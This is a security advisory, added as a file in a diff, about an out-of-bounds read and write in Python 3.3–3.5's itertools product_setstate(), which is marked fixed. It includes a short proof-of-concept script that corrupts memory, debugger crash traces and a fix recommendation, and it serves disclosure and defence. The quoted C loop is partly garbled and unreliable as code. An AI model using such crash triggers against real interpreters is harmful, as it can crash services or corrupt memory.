@@ -1,0 +1,64 @@
+Title: Python 3.3 - 3.5 product_setstate() Out-of-bounds Read
+Credit: John Leitch (john@autosectools.com), Bryce Darling (darlingbryce@gmail.com)
+Url1: http://autosectools.com/Page/Python-product_setstate-Out-of-bounds-Read
+Url2: http://bugs.python.org/issue25021
+Resolution: Fixed
+
+Python 3.3 - 3.5 suffer from a vulnerability caused by the behavior of the product_setstate() function. When called, the function loops over the state tuple provided and clamps each given index to a value within a range from 0 up to the max number of pools. Then, it loops over the pools and gets an item from the pool using the previously clamped index value.
+
+However, for the upper bound, the clamping logic is using the number of pools and not the size of the individual pool, which can result in a call to PyTuple_GET_ITEM that uses an index outside of the bounds of the pool:
+
+    for (i=0; i n-1)
+            index = n-1;
+        lz->indices[i] = index;
+    }
+
+    result = PyTuple_New(n);
+    if (!result)
+        return NULL;
+    for (i=0; ipools, i);
+        PyObject *element = PyTuple_GET_ITEM(pool, lz->indices[i]);
+        Py_INCREF(element);
+        PyTuple_SET_ITEM(result, i, element);
+    }
+    
+The invalid result of the PyTyple_GET_ITEM() expression is then passed to Py_INCREF(), which performs a write operation that corrupts memory.
+
+In some applications, it may be possible to exploit this behavior to corrupt sensitive information, crash, or achieve code execution. The out-of-bounds write can be observed by running the following script:
+
+import itertools
+
+p = itertools.product((0,),(0,))
+p.__setstate__((0, 1))
+
+Which, depending on the arrangement of memory, may produce an exception such as this:
+
+0:000> g
+(ea4.11a4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0000c962 ebx=059e8f80 ecx=00000000 edx=00000000 esi=004af564 edi=05392f78
+eip=613211eb esp=004af4d0 ebp=004af4f8 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+python35_d!product_setstate+0x13b:
+613211eb 8b5108          mov     edx,dword ptr [ecx+8] ds:002b:00000008=????????
+0:000> k1
+ChildEBP RetAddr  
+004af4f8 61553a22 python35_d!product_setstate+0x13b [c:\source\python-3.5.0b3\modules\itertoolsmodule.c @ 2266]
+
+In some cases, EIP corruption may occur:
+
+0:000> r
+eax=00000000 ebx=03e0f790 ecx=6d2ad658 edx=00000002 esi=03e0f790 edi=6d0dbb20
+eip=00000000 esp=004cf6a0 ebp=004cf6ac iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+00000000 ??              ???
+0:000> k4
+ChildEBP RetAddr
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+004cf69c 6d08a390 0x0
+004cf6ac 6d02b688 python35!PyIter_Next+0x10
+004cf6c0 6d0dbb6e python35!chain_next+0x58
+004cf6d0 6d0a021d python35!wrap_next+0x4e
+
+To fix this issue, it is recommended that product_setstate() be updated to clamp indices within a range from 0 up to the size of the pool in the body of the result tuple building loop.
